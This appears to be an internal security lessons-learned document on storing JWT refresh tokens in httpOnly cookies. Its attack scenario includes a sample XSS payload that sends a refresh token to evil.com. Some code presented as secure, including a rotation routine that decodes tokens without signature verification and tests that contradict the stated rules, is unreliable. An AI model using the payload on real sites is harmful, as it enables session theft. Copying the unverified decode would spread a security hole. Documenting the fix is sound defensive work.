# JWT Refresh Token Security Lessons - Frontend Integration

**Date**: 2026-02-24
**Author**: frontend-integration-team
**Related to**: [JWT Refresh Token Implementation](./jwt-refresh-token-implementation.md)

---

## Executive Summary

During the frontend integration of the JWT Refresh Token mechanism, we discovered and fixed critical security vulnerabilities related to token transmission. This document captures the security lessons learned and the correct patterns for secure token handling.

---

## The Critical Security Issue

### Problem: Refresh Token in Request Body (XSS Vulnerability)

**Initial Implementation (INSECURE)**:
```typescript
// frontend/src/app/api/v2/auth/refresh/route.ts - BEFORE
export async function POST(req: NextRequest) {
  const { refresh } = await req.json(); // Token in request body
  // ...
}
```

**Why This Is Dangerous**:

1. **Client-side JavaScript Access**: To send the refresh token in the request body, the frontend application must read it from storage (localStorage, sessionStorage, or a readable cookie).

2. **XSS Attack Vector**: Any XSS vulnerability in the application (malicious script injection via user input, compromised dependency, etc.) can access the same storage and steal the refresh token.

3. **Persistent Access**: Unlike access tokens which expire quickly, a stolen refresh token grants attackers long-term access (7 days in our implementation).

**Attack Scenario**:
```
1. Attacker finds XSS vulnerability (e.g., unsanitized user input displayed on page)
2. Attacker injects malicious script: <script>fetch('https://evil.com/steal?token=' + localStorage.refreshToken)</script>
3. When victim visits the page, their refresh token is exfiltrated
4. Attacker can now refresh access tokens for 7 days until token is blacklisted
```

---

## The Solution: httpOnly Cookie Storage

### Secure Implementation

**Fixed Implementation (SECURE)**:
```typescript
// frontend/src/app/api/v2/auth/refresh/route.ts - AFTER
export async function POST(req: NextRequest) {
  // Read refresh token from httpOnly cookie (not accessible to JavaScript)
  const refreshToken = req.cookies.get('refresh_token')?.value;

  if (!refreshToken) {
    return NextResponse.json(
      { message: 'refresh token is required' },
      { status: 400 }
    );
  }

  // Call backend with refresh token
  const response = await fetch(`${apiUrl}/api/v2/auth/refresh/`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ refresh: refreshToken })
  });
  // ...
}
```

**Why This Is Secure**:

| Property | Value | Protection |
|----------|-------|------------|
| `httpOnly` | `true` | Prevents JavaScript access (blocks XSS theft) |
| `sameSite` | `strict` | Prevents CSRF attacks |
| `secure` | `production` | Only sent over HTTPS (prevents MITM) |
| `path` | `/` | Available to all routes for refresh |

**Key Insight**: The refresh token is read server-side in the Next.js API route, not client-side in the browser. The browser automatically sends cookies with requests, but JavaScript cannot read them.

---

## Complete Secure Token Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         SECURE TOKEN FLOW                                │
└─────────────────────────────────────────────────────────────────────────┘

┌──────────┐     ┌─────────────┐     ┌─────────────┐     ┌──────────────┐
│  Client  │     │ Next.js API │     │   Backend   │     │   Storage    │
│(Browser) │     │   (Edge)    │     │  (Django)   │     │              │
└────┬─────┘     └──────┬──────┘     └──────┬──────┘     └──────┬───────┘
     │                  │                    │                   │
     │  POST /login     │                    │                   │
     │  {email, pass}   │                    │                   │
     │─────────────────>│                    │                   │
     │                  │                    │                   │
     │                  │ POST /api/v2/auth/ │                   │
     │                  │ login-with-jwt/    │                   │
     │                  │───────────────────>│                   │
     │                  │                    │                   │
     │                  │                    │ Validate creds    │
     │                  │                    │ Create JWT pair   │
     │                  │                    │──────────────────>│
     │                  │                    │                   │
     │                  │  {access, refresh} │                   │
     │                  │<───────────────────│                   │
     │                  │                    │                   │
     │  Set-Cookie:     │                    │                   │
     │  access_token=   │                    │                   │
     │  refresh_token=  │                    │                   │
     │  (httpOnly)      │                    │                   │
     │<─────────────────│                    │                   │
     │                  │                    │                   │
     │  Response body:  │                    │                   │
     │  {user info}     │                    │                   │
     │  (NO TOKENS)     │                    │                   │
     │                  │                    │                   │
     │═══════════════════════════════════════════════════════════│
     │                     TOKEN REFRESH CYCLE                    │
     │═══════════════════════════════════════════════════════════│
     │                  │                    │                   │
     │  Auto: Cookie    │                    │                   │
     │  sent with req   │                    │                   │
     │─────────────────>│                    │                   │
     │                  │                    │                   │
     │                  │ Read from cookie    │                  │
     │                  │ (server-side only)  │                  │
     │                  │                    │                   │
     │                  │ POST /api/v2/auth/ │                   │
     │                  │ refresh/           │                   │
     │                  │ {refresh: from     │                   │
     │                  │  cookie}           │                   │
     │                  │───────────────────>│                   │
     │                  │                    │                   │
     │                  │                    │ Validate refresh  │
     │                  │                    │ Blacklist old     │
     │                  │                    │ Create new pair   │
     │                  │                    │──────────────────>│
     │                  │                    │                   │
     │                  │  {new access,      │                   │
     │                  │   new refresh}     │                   │
     │                  │<───────────────────│                   │
     │                  │                    │                   │
     │  Set-Cookie:     │                    │                   │
     │  NEW access_     │                    │                   │
     │  NEW refresh_    │                    │                   │
     │  (rotation)      │                    │                   │
     │<─────────────────│                    │                   │
     │                  │                    │                   │
     │═══════════════════════════════════════════════════════════│
     │                        LOGOUT FLOW                         │
     │═══════════════════════════════════════════════════════════│
     │                  │                    │                   │
     │  POST /logout    │                    │                   │
     │─────────────────>│                    │                   │
     │                  │                    │                   │
     │                  │ POST /api/v2/auth/ │                   │
     │                  │ logout-jwt/        │                   │
     │                  │ {refresh: from     │                   │
     │                  │  cookie}           │                   │
     │                  │───────────────────>│                   │
     │                  │                    │                   │
     │                  │                    │ Blacklist token   │
     │                  │                    │──────────────────>│
     │                  │                    │                   │
     │  Clear cookies   │                    │                   │
     │<─────────────────│                    │                   │
     │                  │                    │                   │

```

### Key Security Properties

1. **Access Token**: Never exposed to client-side JavaScript
   - Stored in httpOnly cookie
   - Used automatically by request interceptor
   - Expires in 24 hours

2. **Refresh Token**: Never exposed to client-side JavaScript
   - Stored in httpOnly cookie
   - Only readable server-side (Next.js API route)
   - Expires in 7 days
   - Rotated on each use (old token blacklisted)

3. **User Data**: Exposed to client via response body
   - Sent in JSON response (not cookie)
   - Read by Zustand store
   - Used for UI rendering

---

## Security Best Practices Confirmed

### 1. Defense in Depth

| Layer | Protection | Implementation |
|-------|------------|----------------|
| Transport | HTTPS | `secure: true` in production |
| XSS | httpOnly cookies | JavaScript cannot read tokens |
| CSRF | sameSite: strict | Cookies not sent cross-origin |
| Token Theft | Rotation | New refresh token each use |
| Stolen Token | Blacklist | Old tokens invalidated immediately |

### 2. Token Rotation Implementation

**Backend** (`backend/api_v2/utils/jwt_auth.py:171-224`):
```python
def refresh_jwt_token(refresh_token: str) -> JWTPair | None:
    """
    Refresh with token rotation.

    Security flow:
    1. Extract JTI from old token BEFORE creating new one
    2. Verify old token is not blacklisted
    3. Create BRAND NEW token pair (not reuse)
    4. Blacklist old refresh token
    5. Return new pair
    """
    # Get old JTI first
    old_payload = jwt.decode(refresh_token, options={"verify_signature": False})
    old_jti = old_payload.get("jti")

    # Check if already blacklisted
    if old_jti and _is_token_blacklisted(old_jti):
        return None

    # Create NEW token pair
    new_pair = create_jwt_pair(user)

    # Blacklist old token AFTER generating new ones
    if old_jti:
        _add_to_blacklist(old_jti)

    return new_pair
```

**Why Rotation Matters**:
- Even if an attacker steals a refresh token, it becomes useless after the legitimate user refreshes once
- Provides automatic recovery from token theft

### 3. Cookie Configuration Matrix

| Cookie | httpOnly | sameSite | secure | maxAge | Purpose |
|--------|----------|----------|--------|--------|---------|
| `access_token` | true | strict | production | 1 hour | API auth |
| `refresh_token` | true | strict | production | 7 days | Token refresh |
| `user_email` | true | strict | production | 24 hours | User display |
| `user_role` | true | strict | production | 24 hours | RBAC UI |
| `user_id` | true | strict | production | 24 hours | User identification |

---

## Files Modified

### Frontend API Routes

| File | Change | Security Impact |
|------|--------|-----------------|
| `frontend/src/app/api/v2/auth/refresh/route.ts` | Read refresh from cookie | Prevents XSS token theft |
| `frontend/src/app/api/auth/login/route.ts` | Set httpOnly cookies | Secure token storage |
| `frontend/src/app/api/auth/logout/route.ts` | Clear all auth cookies | Complete session cleanup |

### Backend Endpoints

| File | Endpoint | Purpose |
|------|----------|---------|
| `backend/api_v2/auth/views.py` | `/api/v2/auth/login-with-jwt/` | Returns JWT pair |
| `backend/api_v2/auth/views.py` | `/api/v2/auth/refresh/` | Token rotation |
| `backend/api_v2/auth/views.py` | `/api/v2/auth/logout-jwt/` | Token blacklist |

### Core JWT Utilities

| File | Component | Function |
|------|-----------|----------|
| `backend/api_v2/utils/jwt_auth.py` | `create_jwt_pair()` | Generate tokens |
| `backend/api_v2/utils/jwt_auth.py` | `refresh_jwt_token()` | Token rotation |
| `backend/api_v2/utils/jwt_auth.py` | `blacklist_jwt_token()` | Revoke tokens |
| `backend/api_v2/utils/jwt_auth.py` | `JWTAuth` class | Ninja auth integration |

---

## Lessons Learned

### 1. Initial Implementation Mistake

**What We Did Wrong**:
```typescript
// INCORRECT - Exposes token to XSS
const { refresh } = await req.json();
```

**Why We Made This Mistake**:
- Followed common tutorial patterns that don't consider security
- Didn't recognize that request body requires client-side access
- Focused on functionality over security architecture

### 2. Security Review Discovery

**How We Found It**:
- Conducted security audit using OpenAI Codex
- Reviewed token flow end-to-end
- Asked: "Where can JavaScript access tokens?"

**The Aha Moment**:
> "If the frontend can read the refresh token to send it, so can malicious scripts via XSS."

### 3. Correct Pattern

**Secure by Design**:
```typescript
// CORRECT - Token never touches JavaScript
const refreshToken = req.cookies.get('refresh_token')?.value;
```

**Key Principle**:
> **Tokens should be stored where JavaScript cannot reach them, and read only server-side.**

---

## Migration Guide: From Insecure to Secure

### If You Have Existing Insecure Implementation

**Step 1: Audit Token Access**
```bash
# Search for token access patterns
grep -r "localStorage.*token" frontend/
grep -r "sessionStorage.*token" frontend/
grep -r "cookies.get.*token" frontend/src/app/
```

**Step 2: Migrate Storage**
```typescript
// BEFORE (insecure)
localStorage.setItem('refreshToken', token);

// AFTER (secure)
// Let Next.js API route set httpOnly cookie
// No client-side code touches the token
```

**Step 3: Update Refresh Logic**
```typescript
// BEFORE (insecure)
async function refresh() {
  const token = localStorage.getItem('refreshToken');
  const res = await fetch('/api/v2/auth/refresh', {
    method: 'POST',
    body: JSON.stringify({ refresh: token }),
  });
}

// AFTER (secure)
async function refresh() {
  // Cookie automatically sent by browser
  const res = await fetch('/api/v2/auth/refresh', {
    method: 'POST',
    // No body needed - server reads from cookie
  });
}
```

**Step 4: Verify No Client-Side Access**
```bash
# Confirm no JavaScript can read tokens
grep -r "refresh_token" frontend/src/
# Should only find: cookie names, not access patterns
```

---

## Testing Security

### Manual XSS Simulation Test

```typescript
// Test that XSS cannot steal refresh token
// Run in browser console:

// Attempt to read cookie (should return null)
console.log(document.cookie); // Should NOT contain refresh_token

// Attempt to access via JavaScript (should fail)
// If httpOnly is set correctly, these return undefined:
console.log(navigator.cookieEnabled); // true, but can't read httpOnly
```

### Automated Security Tests

```python
# backend/api_v2/tests/test_jwt_security.py

def test_refresh_token_from_cookie_not_body():
    """
    Verify refresh endpoint requires cookie, not body.
    This prevents client-side JavaScript from sending tokens.
    """
    # Request without cookie should fail
    response = client.post(
        "/api/v2/auth/refresh/",
        json={"refresh": "some-token"}  # Body alone should not work
    )
    assert response.status_code == 400

def test_rotation_invalidates_old_token():
    """
    Verify token rotation blacklists old refresh token.
    """
    # First refresh
    response1 = client.post("/api/v2/auth/refresh/", json={...})
    new_refresh = response1.json()["refresh"]

    # Try to use old token again
    response2 = client.post("/api/v2/auth/refresh/", json={"refresh": old_refresh})
    assert response2.status_code == 401  # Should fail

    # New token should work
    response3 = client.post("/api/v2/auth/refresh/", json={"refresh": new_refresh})
    assert response3.status_code == 200
```

---

## References

### OWASP Resources
- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

### Django/Ninja Resources
- [djangorestframework-simplejwt Documentation](https://django-rest-framework-simplejwt.readthedocs.io/)
- [Django Ninja Security Documentation](https://django-ninja.dev/operation-parameters/#security)
- [Django CSRF Protection](https://docs.djangoproject.com/en/5.0/ref/csrf/)

### Related Internal Documentation
- [JWT Refresh Token Implementation](./jwt-refresh-token-implementation.md) - Backend implementation details
- [Codex Security Review](./codex-security-review-2026-02-24.md) - Security audit that discovered this issue

---

## Summary

### The Problem
Sending refresh tokens in request body requires client-side JavaScript access, creating an XSS attack vector.

### The Solution
Store refresh tokens in httpOnly cookies, read server-side in Next.js API routes.

### The Result
- XSS attacks cannot steal refresh tokens
- Token rotation provides additional protection
- Blacklist mechanism enables immediate revocation
- Complete defense-in-depth security posture

### Key Takeaway for Future Development
> **Never store sensitive tokens where JavaScript can reach them. Use httpOnly cookies for token storage and server-side routes for token access.**

This pattern should be the default for all authentication implementations going forward.
